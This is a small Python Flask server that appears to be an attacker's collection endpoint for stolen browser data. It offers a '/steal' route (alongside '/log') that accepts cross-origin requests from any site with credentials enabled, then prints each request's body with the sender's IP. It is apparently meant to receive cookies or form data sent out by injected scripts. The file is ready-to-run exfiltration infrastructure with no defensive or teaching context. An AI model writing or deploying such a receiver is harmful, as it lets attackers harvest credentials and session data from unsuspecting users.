from flask import Flask, request, make_response
from flask_cors import CORS
from datetime import datetime
import os

app = Flask(__name__)

# Apply CORS to all routes and methods
CORS(app, resources={r"/*": {"origins": "*"}}, supports_credentials=True)

@app.route('/log', methods=['GET', 'POST', 'OPTIONS'])
@app.route('/steal', methods=['GET', 'POST', 'OPTIONS'])
def log_data():
    if request.method == 'OPTIONS':
        return make_response("OK", 200)  # Needed for preflight

    ip = request.remote_addr
    data = request.get_data(as_text=True)
    now = datetime.utcnow().isoformat()
    log_line = f"[{now}] {ip} → {data}"
    print(log_line, flush=True)

    return make_response("Logged", 200)

@app.route('/')
def index():
    return "Logger is up."

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
